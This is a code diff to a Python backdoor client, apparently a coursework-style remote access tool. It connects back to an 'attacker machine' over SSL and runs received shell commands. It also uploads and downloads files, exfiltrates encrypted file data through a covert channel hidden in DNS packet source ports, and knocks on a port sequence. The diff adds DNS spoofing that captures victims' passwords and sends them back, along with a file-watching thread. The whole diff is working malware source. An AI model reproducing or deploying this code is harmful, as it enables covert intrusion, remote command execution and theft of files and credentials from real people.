@@ -15,16 +15,20 @@ def change_settings():
 
 
 import os.path
-import socket, subprocess
+import os
+import signal
+import socket, subprocess, ssl
+import client_config
+import dns_spoofer
+import notify
 from utils import generate_password, encrypt
 from scapy.all import *
+from multiprocessing import Process
+from threading import Thread
 
-PORT = 4433  # The same port as used by the server
-DESTINATION = "192.168.1.149"
-EOF = "G"
-PORT_KNOCKER = [8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000]
-PASS = ""
 
+DNS_PID = ""
+NOTIFY_THREAD = ""
 
 def upload(s, cmdArg):
     fs = cmdArg[2]
@@ -39,11 +43,12 @@ def upload(s, cmdArg):
                 totalFS += len(dr)
             else:
                 break
-def download(sock,filePath):
+
+def download(sock,filePath,password):
     # call encrypt function - returns file size or data?
     # read file - return file data
     # encrypt file data - return character length
-    fileInformation = encrypt_data(filePath)
+    fileInformation = encrypt_data(filePath, password)
     if fileInformation[0] == 0:
         sock.send(str(fileInformation[0]))
         print "not a valid file."
@@ -52,27 +57,57 @@ def download(sock,filePath):
         time.sleep(2)
         send_data_with_covert(fileInformation[0])
         time.sleep(3)
-        send_data_with_covert(EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF)
-    # send encrypted data using covert + delay + EOF bomb
+        send_data_with_covert(client_config.EOF+client_config.EOF+client_config.EOF+client_config.EOF+client_config.EOF+
+                              client_config.EOF+ client_config.EOF+ client_config.EOF+ client_config.EOF+
+                              client_config.EOF)
+    # send encrypted data using covert + delay + config.EOF bomb
+def dns(cmdArg, ssl_sock):
+    global DNS_PID
+    if cmdArg[1] == "stop":
+        os.kill(DNS_PID, signal.SIGTERM)
+        if os.path.isfile(client_config.DNSPOOF_PASSWORD_FILE):
+            with open(client_config.DNSPOOF_PASSWORD_FILE) as f:
+                content = f.read()
+                ssl_sock.send(content)
+            os.remove(client_config.DNSPOOF_PASSWORD_FILE)
+        else:
+            ssl_sock.send("-------no passwords captured--------")
+    elif cmdArg[1] == "start":
+        p = Process(target=dns_spoofer.dnspoof, args=(cmdArg[2], cmdArg[3], cmdArg[4], cmdArg[5], cmdArg[6]))
+        p.start()
+        DNS_PID = p.pid
 
-def create_inside_out_connection():
+def create_inside_out_connection(password):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #wrap with SSL
+    ssl_sock = ssl.wrap_socket(s, ca_certs="./../certificate/server.crt", cert_reqs=ssl.CERT_REQUIRED)
     # connect to attacker machine
-    s.connect((DESTINATION, PORT))
+    ssl_sock.connect((client_config.DESTINATION, client_config.PORT))
     # send we are connected
-    s.send('[*] Venom Injected!')
+    ssl_sock.send('[*] Venom Injected!')
     # start loop
     while 1:
         # recieve shell command
-        data = s.recv(1024)
+        data = ssl_sock.recv(1024)
         # if its quit, then break out and close socket
         cmdArg = data.split(" ")
         if cmdArg[0] == "quit":
             break
         elif cmdArg[0] == "upload":
-            upload(s, cmdArg)
+            upload(ssl_sock, cmdArg)
         elif cmdArg[0] == "download":
-            download(s,cmdArg[1])
+            download(ssl_sock,cmdArg[1],password)
+        elif cmdArg[0] == "dnspoof":
+            dns(cmdArg, ssl_sock)
+        elif cmdArg[0] == "inotify":
+            global NOTIFY_THREAD
+            if cmdArg[1] == "stop":
+                notify.KILL_PROCESS = True
+            elif cmdArg[1] == "start":
+                notify.KILL_PROCESS = False
+                NOTIFY_THREAD = Thread(target=notify.notify, args=(cmdArg[2]))
+                NOTIFY_THREAD.start()
+
         elif data == '':
             break
         else:
@@ -83,16 +118,16 @@ def create_inside_out_connection():
             stdout_value = proc.stdout.read() + proc.stderr.read()
             if stdout_value == '':
                 stdout_value = 'Command had no output.\n'
-            s.send(stdout_value)
+            ssl_sock.send(stdout_value)
 
     # close socket
-    s.close()
+    ssl_sock.close()
 
 
-def encrypt_data(filePath):
+def encrypt_data(filePath,password):
     if os.path.isfile(filePath):
         with open(filePath, "rb") as fileToDownload:
-            encryptedFileContent = encrypt(fileToDownload.read(), PASS)
+            encryptedFileContent = encrypt(fileToDownload.read(), password)
             return [encryptedFileContent, len(encryptedFileContent)]
     else:
         return [0]
@@ -100,7 +135,7 @@ def encrypt_data(filePath):
 def send_data_with_covert(sendContent):
     for i in range(0, len(sendContent), 2):
         new_packet = make_packet(sendContent[i], sendContent[i + 1] if i < len(sendContent) - 1 else 0)
-        send(new_packet)
+        send(new_packet, verbose=0)
 
 
 def make_packet(char1, char2):
@@ -115,7 +150,7 @@ def make_packet(char1, char2):
         secondCharHex = '2e'
         CovertSourcePort = int(firstCharHex + secondCharHex, 16)
 
-    packet = IP(src=DESTINATION, dst=DESTINATION) / UDP(sport=CovertSourcePort) / DNS(rd=1,
+    packet = IP(src=client_config.DESTINATION, dst=client_config.DESTINATION) / UDP(sport=CovertSourcePort) / DNS(rd=1,
                                                                                       qd=DNSQR(qname="google.com"))
     return packet
 
@@ -134,19 +169,18 @@ def generate_sport(char1, char2):
 
 def port_knocking(password):
     pass_index = 0
-    for i in range(len(PORT_KNOCKER)):
+    for i in range(len(client_config.PORT_KNOCK_ARRAY)):
         s_port = generate_sport(password[pass_index], password[pass_index + 1])
-        packet = IP(dst=DESTINATION) / UDP(sport=s_port, dport=PORT_KNOCKER[i])
+        packet = IP(dst=client_config.DESTINATION) / UDP(sport=s_port, dport=client_config.PORT_KNOCK_ARRAY[i])
         pass_index += 2
-        send(packet)
+        send(packet, verbose=0)
     time.sleep(2)
 
 def main():
     #change_settings()
-    global PASS
-    PASS = generate_password()
-    port_knocking(PASS)
-    create_inside_out_connection()
+    password = generate_password()
+    port_knocking(password)
+    create_inside_out_connection(password)
 
 
 if __name__ == '__main__':
